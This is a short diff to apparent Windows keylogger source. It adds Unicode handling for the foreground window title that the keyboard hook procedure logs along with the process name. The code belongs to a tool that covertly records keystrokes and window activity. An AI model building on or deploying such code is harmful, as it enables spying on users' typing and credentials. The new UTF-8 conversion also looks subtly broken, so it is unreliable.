@@ -21,7 +21,7 @@ HHOOK KeyboardHook;
 // Shift Key 
 bool shift = FALSE;
 // Windows Title Text -260 char-
-CHAR cWindow[1000];
+WCHAR cWindow[1000];
 // NULL is ok
 HWND lastWindow = NULL;
 // File Path
@@ -562,12 +562,15 @@ LRESULT CALLBACK HookProcedure(int nCode, WPARAM wParam, LPARAM lParam)
 				*/
 
 				HWND hwnd = GetForegroundWindow();
-				int c = GetWindowTextA(hwnd, cWindow, sizeof(cWindow));
+				int windowTextSize = sizeof(cWindow) / sizeof(cWindow[0]);
+				int c = GetWindowTextW(hwnd, cWindow, windowTextSize);
 				debug << c;
+				std::vector<char> windowText(windowTextSize);
+				WideCharToMultiByte(CP_UTF8, 0, cWindow, -1, &windowText[0], windowTextSize, NULL, NULL);
 
 				std::string moduleName = My::GetWindowFileName(hwnd);
 
-				temp << " - Current Window: " << cWindow << "\n";
+				temp << " - Current Window: " << std::string(windowText.begin(), windowText.end()) << "\n";
 				temp << " - Current Process: " << moduleName << "\n\n";
 
 				//outPut.append(temp.str());
